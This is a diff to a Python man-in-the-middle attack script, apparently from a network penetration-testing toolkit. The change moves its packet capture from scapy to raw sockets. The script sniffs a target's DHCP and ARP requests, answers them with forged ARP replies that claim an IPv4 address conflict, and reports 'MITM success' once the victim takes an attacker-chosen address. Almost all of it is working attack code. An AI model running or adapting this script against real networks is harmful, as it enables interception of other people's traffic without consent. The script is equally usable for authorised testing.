@@ -8,11 +8,10 @@ utils_path = project_root_path + "/Utils/"
 path.append(utils_path)
 
 from base import Base
-from network import Ethernet_raw, ARP_raw, DHCP_raw
+from network import Ethernet_raw, ARP_raw, IP_raw, UDP_raw, DHCP_raw
 from sys import exit
 from argparse import ArgumentParser
-from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
-from socket import socket, AF_PACKET, SOCK_RAW
+from socket import socket, AF_PACKET, SOCK_RAW, htons
 from tm import ThreadManager
 from time import sleep
 # endregion
@@ -43,6 +42,8 @@ if not args.quiet:
 # region Set global variables
 eth = Ethernet_raw()
 arp = ARP_raw()
+ip = IP_raw()
+udp = UDP_raw()
 dhcp = DHCP_raw()
 
 target_mac_address = str(args.target_mac).lower()
@@ -158,21 +159,21 @@ def reply(request):
     # endregion
 
     # region DHCP REQUESTS
-    if request.haslayer(DHCP):
+    if 'DHCP' in request.keys():
 
         # region Get DHCP transaction id
-        transaction_id = request[BOOTP].xid
+        transaction_id = request['BOOTP']['transaction-id']
         # endregion
 
         # region DHCP DECLINE
-        if request[DHCP].options[0][1] == 4:
+        if request['DHCP'][53] == 4:
             Base.print_info("DHCP DECLINE from: ", target_mac_address, " transaction id: ", hex(transaction_id))
             if transaction_id_global != 0:
                 tm.add_task(dhcp_response_sender)
         # endregion
 
         # region DHCP REQUEST
-        if request[DHCP].options[0][1] == 3:
+        if request['DHCP'][53] == 3:
 
             # region Get next DHCP transaction id
             if transaction_id != 0:
@@ -182,9 +183,8 @@ def reply(request):
             # endregion
 
             # region Get DHCP requested ip address
-            for option in request[DHCP].options:
-                if option[0] == "requested_addr":
-                    requested_ip = str(option[1])
+            if 50 in request['DHCP'].keys():
+                requested_ip = str(request['DHCP'][50])
             # endregion
 
             # region Print info message
@@ -204,56 +204,57 @@ def reply(request):
     # endregion
 
     # region ARP REQUESTS
-    if request.haslayer(ARP):
+    if 'ARP' in request.keys():
         if requested_ip is not None:
-            if request[ARP].op == 1:
-                if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
+            if request['Ethernet']['destination'] == "ff:ff:ff:ff:ff:ff" and \
+                    request['ARP']['target-mac'] == "00:00:00:00:00:00":
 
-                    # region Set local variables
-                    arp_sender_mac_address = request[ARP].hwsrc
-                    arp_sender_ip_address = request[ARP].psrc
-                    arp_target_ip_address = request[ARP].pdst
+                # region Set local variables
+                arp_sender_mac_address = request['ARP']['sender-mac']
+                arp_sender_ip_address = request['ARP']['sender-ip']
+                arp_target_ip_address = request['ARP']['target-ip']
+                # endregion
+
+                # region Print info message
+                Base.print_info("ARP request from: ", arp_sender_mac_address, " \"",
+                                "Who has " + arp_target_ip_address + "? Tell " + arp_sender_ip_address, "\"")
+                # endregion
+
+                # region ARP target IP is DHCP requested IP
+                if arp_target_ip_address == requested_ip:
+
+                    # region If ARP target IP is target IP - print Possible mitm success
+                    if arp_target_ip_address == target_ip_address:
+                        if not print_possible_mitm:
+                            Base.print_warning("Possible MiTM success: ",
+                                               target_ip_address + " (" + target_mac_address + ")")
+                            print_possible_mitm = True
                     # endregion
 
-                    # region Print info message
-                    Base.print_info("ARP request from: ", arp_sender_mac_address, " \"",
-                                    "Who has " + arp_target_ip_address + "? Tell " + arp_sender_ip_address, "\"")
+                    # region If ARP target IP is not target IP - send 'IPv4 address conflict' ARP response
+                    else:
+                        arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
+                                                      ethernet_dst_mac=target_mac_address,
+                                                      sender_mac=your_mac_address,
+                                                      sender_ip=requested_ip,
+                                                      target_mac=arp_sender_mac_address,
+                                                      target_ip=arp_sender_ip_address)
+                        SOCK.send(arp_reply)
+                        Base.print_info("ARP response to:  ", arp_sender_mac_address, " \"",
+                                        arp_target_ip_address + " is at " + your_mac_address,
+                                        "\" (IPv4 address conflict)")
                     # endregion
 
-                    # region ARP target IP is DHCP requested IP
-                    if arp_target_ip_address == requested_ip:
+                # endregion
 
-
-                        # region If ARP target IP is target IP - print Possible mitm success
-                        if arp_target_ip_address == target_ip_address:
-                            if not print_possible_mitm:
-                                Base.print_warning("Possible MiTM success: ",
-                                                   target_ip_address + " (" + target_mac_address + ")")
-                                print_possible_mitm = True
-                        # endregion
-
-                        # region If ARP target IP is not target IP - send 'IPv4 address conflict' ARP response
-                        else:
-                            arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
-                                                          ethernet_dst_mac=target_mac_address,
-                                                          sender_mac=your_mac_address, sender_ip=requested_ip,
-                                                          target_mac=request[ARP].hwsrc, target_ip=request[ARP].psrc)
-                            SOCK.send(arp_reply)
-                            Base.print_info("ARP response to:  ", arp_sender_mac_address, " \"",
-                                            arp_target_ip_address + " is at " + your_mac_address,
-                                            "\" (IPv4 address conflict)")
-                        # endregion
-
-                    # endregion
-
-                    # region ARP target IP is your IP - MITM SUCCESS
-                    if arp_target_ip_address == your_ip_address:
-                        if not print_success_mitm:
-                            Base.print_success("MITM success: ", target_ip_address + " (" + target_mac_address + ")")
-                            print_success_mitm = True
-                        sleep(5)
-                        exit(0)
-                    # endregion
+                # region ARP target IP is your IP - MITM SUCCESS
+                if arp_target_ip_address == your_ip_address:
+                    if not print_success_mitm:
+                        Base.print_success("MITM success: ", target_ip_address + " (" + target_mac_address + ")")
+                        print_success_mitm = True
+                    sleep(5)
+                    exit(0)
+                # endregion
     # endregion
 
 # endregion
@@ -261,8 +262,123 @@ def reply(request):
 
 # region Main function
 if __name__ == "__main__":
-    Base.print_info("Waiting for a ARP or DHCP requests from: ", args.target_mac)
-    sniff(lfilter=lambda d: d.src == args.target_mac,
-          filter="arp or (udp and src port 68 and dst port 67)",
-          prn=reply, iface=current_network_interface)
+
+    # region Sniff network
+
+    # region Create RAW socket for sniffing
+    rawSocket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+    # endregion
+
+    # region Local variables
+    ethernet_header_length = 14
+    arp_packet_length = 28
+    udp_header_length = 8
+    # endregion
+
+    # region Print info message
+    Base.print_info("Waiting for a ARP or DHCP requests from: ", target_mac_address)
+    # endregion
+
+    # region Start sniffing
+    while True:
+
+        # region Get packets from RAW socket
+        packets = rawSocket.recvfrom(2048)
+
+        for packet in packets:
+
+            # region Get Ethernet header from packet
+            ethernet_header = packet[0:ethernet_header_length]
+            ethernet_header_dict = eth.parse_header(ethernet_header)
+            # endregion
+
+            # region Success parse Ethernet header
+            if ethernet_header_dict is not None:
+
+                # region Target MAC address is Set
+                if target_mac_address is not None:
+                    if ethernet_header_dict['source'] != target_mac_address:
+                        break
+                # endregion
+
+                # region ARP packet
+
+                # 2054 - Type of ARP packet (0x0806)
+                if ethernet_header_dict['type'] == 2054:
+
+                    # Get ARP packet
+                    arp_header = packet[ethernet_header_length:ethernet_header_length + arp_packet_length]
+                    arp_header_dict = arp.parse_packet(arp_header)
+
+                    # Success ARP packet
+                    if arp_header_dict is not None:
+
+                        # ARP Opcode: 1 - ARP request
+                        if arp_header_dict['opcode'] == 1:
+
+                            # Create full request
+                            request = {
+                                "Ethernet": ethernet_header_dict,
+                                "ARP": arp_header_dict
+                            }
+
+                            # Reply to this request
+                            reply(request)
+
+                # endregion
+
+                # region DHCP packet
+
+                # 2048 - Type of IP packet (0x0800)
+                if ethernet_header_dict['type'] == 2048:
+
+                    # Get IP header
+                    ip_header = packet[ethernet_header_length:]
+                    ip_header_dict = ip.parse_header(ip_header)
+
+                    # Success parse IP header
+                    if ip_header_dict is not None:
+
+                        # UDP
+                        if ip_header_dict['protocol'] == 17:
+
+                            # Get UDP header offset
+                            udp_header_offset = ethernet_header_length + (ip_header_dict['length'] * 4)
+
+                            # Get UDP header
+                            udp_header = packet[udp_header_offset:udp_header_offset + udp_header_length]
+                            udp_header_dict = udp.parse_header(udp_header)
+
+                            # Success parse UDP header
+                            if udp_header is not None:
+                                if udp_header_dict['source-port'] == 68 and udp_header_dict['destination-port'] == 67:
+
+                                    # Get DHCP header offset
+                                    dhcp_packet_offset = udp_header_offset + udp_header_length
+
+                                    # Get DHCP packet
+                                    dhcp_packet = packet[dhcp_packet_offset:]
+                                    dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)
+
+                                    # Create full request
+                                    request = {
+                                        "Ethernet": ethernet_header_dict,
+                                        "IP": ip_header_dict,
+                                        "UDP": udp_header_dict
+                                    }
+                                    request.update(dhcp_packet_dict)
+
+                                    # Reply to this request
+                                    reply(request)
+
+                # endregion
+
+            # endregion
+
+        # endregion
+
+    # endregion
+
+    # endregion
+
 # endregion
